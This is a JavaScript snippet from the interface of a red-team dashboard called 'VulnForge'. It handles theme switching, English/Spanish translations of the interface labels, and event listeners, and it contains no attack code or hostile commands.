    // ============================================================
    window.toggleTheme = function () {
        const isMono = document.body.classList.toggle('monochrome');
        localStorage.setItem('vulnforge_theme', isMono ? 'mono' : 'neon');
        document.getElementById('theme-icon').textContent = isMono ? '◇' : '☾';
        showToast(isMono ? '◼ Monochrome mode' : '🟢 Neon mode');
    };

    // Load saved theme
    if (localStorage.getItem('vulnforge_theme') === 'mono') {
        document.body.classList.add('monochrome');
        document.getElementById('theme-icon').textContent = '◇';
    }

    // ============================================================
    //  LANGUAGE (ES/EN)
    // ============================================================
    const translations = {
        appName:           { en: 'VULNFORGE',       es: 'VULNFORGE' },
        headerTag:         { en: '/* Red Team */',   es: '/* Red Team */' },
        targetLabel:       { en: '>> Target_',       es: '>> Objetivo_' },
        targetPlaceholder: { en: '10.10.10.5 | domain.htb', es: '10.10.10.5 | dominio.htb' },
        connections:       { en: '>> Connections_',  es: '>> Conexiones_' },
        newConn:           { en: '+ New',            es: '+ Nueva' },
        selTarget:         { en: '-- Select target --', es: '-- Seleccionar --' },
        connAlias:         { en: 'Alias (eg: Kali-VPN)', es: 'Alias (ej: Kali-VPN)' },
        connIP:            { en: 'IP: 192.168.1.x',  es: 'IP: 192.168.1.x' },
        connUser:          { en: 'User',             es: 'Usuario' },
        connPass:          { en: 'Pass',             es: 'Contraseña' },
        btnSave:           { en: '✓ Save',           es: '✓ Guardar' },
        btnCancel:         { en: '✕ Cancel',         es: '✕ Cancelar' },
        arsenal:           { en: 'Arsenal',          es: 'Arsenal' },
        catWebRecon:       { en: 'Web Recon',        es: 'Web Recon' },
        catNetwork:        { en: 'Network',          es: 'Red' },
        catSMB:            { en: 'SMB / Windows',    es: 'SMB / Windows' },
        catPivoting:       { en: 'Pivoting',         es: 'Pivoting' },
        catCrypto:         { en: 'Crypto / Decode',  es: 'Crypto / Decod' },
        catExploitation:   { en: 'Exploitation',     es: 'Explotación' },
        catResources:      { en: 'Resources',        es: 'Recursos' },
        catUtilities:      { en: 'Utilities',        es: 'Utilidades' },
        tabTerminal:       { en: '⌨ Terminal',       es: '⌨ Terminal' },
        tabReports:        { en: '📊 Reports',       es: '📊 Informes' },
        tabScripts:        { en: '⚡ Scripts',       es: '⚡ Scripts' },
        tabBounty:         { en: '📋 Bounty',        es: '📋 Bounty' },
        tabAI:             { en: '🤖 AI Writeup',   es: '🤖 AI Writeup' },
        tabAutomation:     { en: '⚙ Automation',   es: '⚙ Automatización' },
        btnConnect:        { en: '> Connect',        es: '> Conectar' },
        btnDisconnect:     { en: '> Disconnect',     es: '> Desconectar' },
        cmdPlaceholder:    { en: '$  enter command...', es: '$  ingresa comando...' },
        btnExecute:        { en: '⏎',                es: '⏎' },
        modulesLoaded:     { en: 'modules loaded',   es: 'módulos cargados' },
        scanReports:       { en: '📊 Scan Reports',  es: '📊 Informes de Escaneo' },
        clearAll:          { en: '✕ clear all',      es: '✕ limpiar todo' },
        noReports:         { en: 'No reports yet',   es: 'Sin informes aún' },
        noReportsDesc:     { en: 'Run a scan from the Arsenal to see results here', es: 'Ejecuta un escaneo desde el Arsenal' },
        templates:         { en: 'Templates',        es: 'Plantillas' },
        editor:            { en: 'EDITOR',           es: 'EDITOR' },
        deployRun:         { en: '⬆ Deploy & Run',  es: '⬆ Desplegar & Ejec' },
        bountyTitle:       { en: '📋 Bug Bounty Report Generator', es: '📋 Generador de Reportes Bounty' },
        aiTitle:           { en: '🤖 AI Writeup Generator', es: '🤖 Generador de Writeups IA' },
        apiConfig:         { en: '⚙ API Configuration', es: '⚙ Configuración API' },
        genReport:         { en: '⚡ Generate Report', es: '⚡ Generar Reporte' },
        downloadMD:        { en: '⬇ Download .md',  es: '⬇ Descargar .md' },
        genWriteup:        { en: '🤖 Generate Writeup', es: '🤖 Generar Writeup' },
        offline:           { en: 'OFFLINE',          es: 'DESCONECTADO' },
        online:            { en: 'ONLINE',           es: 'CONECTADO' },
        disconnected:      { en: 'disconnected',     es: 'desconectado' },
        connected:         { en: 'connected',        es: 'conectado' },
    };

    window.currentLang = localStorage.getItem('vulnforge_lang') || 'en';

    window.switchLanguage = function () {
        window.currentLang = window.currentLang === 'en' ? 'es' : 'en';
        localStorage.setItem('vulnforge_lang', window.currentLang);
        applyLanguage(window.currentLang);
        document.getElementById('lang-text').textContent = window.currentLang.toUpperCase();
        showToast(`🌐 Language: ${window.currentLang === 'en' ? 'English' : 'Español'}`);
    };

    function applyLanguage(lang) {
        document.documentElement.lang = lang;

        // Update all data-i18n elements
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            if (translations[key] && translations[key][lang]) {
                el.textContent = translations[key][lang];
            }
        });

        // Update title
        document.title = `VulnForge — ${lang === 'en' ? 'Red Team Dashboard' : 'Panel Red Team'}`;

        // Update placeholders
        const targetPlaceholder = translations.targetPlaceholder[lang];
        const targetInput = document.getElementById('target-ip');
        if (targetInput) targetInput.placeholder = targetPlaceholder;

        const cmdInput = document.getElementById('cmd-input');
        if (cmdInput) cmdInput.placeholder = translations.cmdPlaceholder[lang];

        // Update connection selector
        const connSel = document.getElementById('conn-selector');
        if (connSel) {
            const firstOpt = connSel.querySelector('option:first-child');
            if (firstOpt) firstOpt.textContent = translations.selTarget[lang];
        }

        // Update connection form placeholders
        const connName = document.getElementById('new-conn-name');
        if (connName) connName.placeholder = translations.connAlias[lang];
        const connIP = document.getElementById('new-conn-ip');
        if (connIP) connIP.placeholder = translations.connIP[lang];
        const connUser = document.getElementById('new-conn-user');
        if (connUser) connUser.placeholder = translations.connUser[lang];
        const connPass = document.getElementById('new-conn-pass');
        if (connPass) connPass.placeholder = translations.connPass[lang];

        // Update new connection buttons
        const saveBtn = document.querySelector('#add-conn-form button:first-child');
        if (saveBtn) saveBtn.textContent = translations.btnSave[lang];
        const cancelBtn = document.querySelector('#add-conn-form button:last-child');
        if (cancelBtn) cancelBtn.textContent = translations.btnCancel[lang];

        // Update empty report state
        const reportEmpty = document.querySelector('.report-empty');
        if (reportEmpty) {
            const nodes = reportEmpty.children;
            if (nodes[1]) nodes[1].textContent = translations.noReports[lang];
            if (nodes[2]) nodes[2].textContent = translations.noReportsDesc[lang];
        }
    }

    // Apply saved language on load
    if (window.currentLang === 'es') {
        document.getElementById('lang-text').textContent = 'ES';
        applyLanguage('es');
    } else {
        document.getElementById('lang-text').textContent = 'EN';
        applyLanguage('en');
    }

    // ============================================================
    //  EVENT LISTENERS
    // ============================================================
    btnConnect.addEventListener('click', connectWS);
    btnDisconnect.addEventListener('click', disconnectWS);
    btnSend.addEventListener('click', window.sendCommand);

    cmdInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.sendCommand();
    });

    targetInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') window.launchTool('gobuster');
    });

    // ── Init ──
    loadConnections();
    loadSavedScripts();
    loadAIConfig();
    renderArsenal();
    window.appendBanner();
});
